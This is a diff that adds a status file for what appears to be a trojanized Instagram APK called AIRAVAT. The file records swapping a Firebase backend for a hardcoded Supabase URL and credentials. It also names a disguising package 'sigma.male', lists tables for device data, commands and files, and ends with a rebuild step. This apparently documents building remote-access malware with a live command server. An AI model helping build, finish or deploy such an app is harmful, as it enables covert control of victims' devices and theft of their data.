@@ -1,0 +1,26 @@
+AIRAVAT Instagram APK - Supabase Integration Status
+================================================
+
+✅ COMPLETED TASKS:
+- Removed Firebase configurations from AndroidManifest.xml
+- Removed Firebase strings and replaced with Supabase configuration  
+- Deleted Firebase property files
+- Added network security configuration for HTTPS
+- Created SupabaseConfig.smali with production credentials
+- Created SupabaseHelper.smali for HTTP operations
+- Updated apktool.yml to remove Firebase references
+
+🔧 CONFIGURATION:
+- Supabase URL: https://auedkftrlingnnyeezgc.supabase.co
+- Package: sigma.male
+- Target Tables: device_data, commands, files
+
+📝 INTEGRATION NOTES:
+- Firebase functionality completely removed
+- Supabase configuration hardcoded in smali classes
+- Network security enforced for HTTPS-only communication
+- All configuration strings updated in res/values/strings.xml
+
+👨‍💻 Credits: Migration to Supabase by bionic sailor
+
+🚀 Ready for recompilation with ./apktool b instagram_decompiled
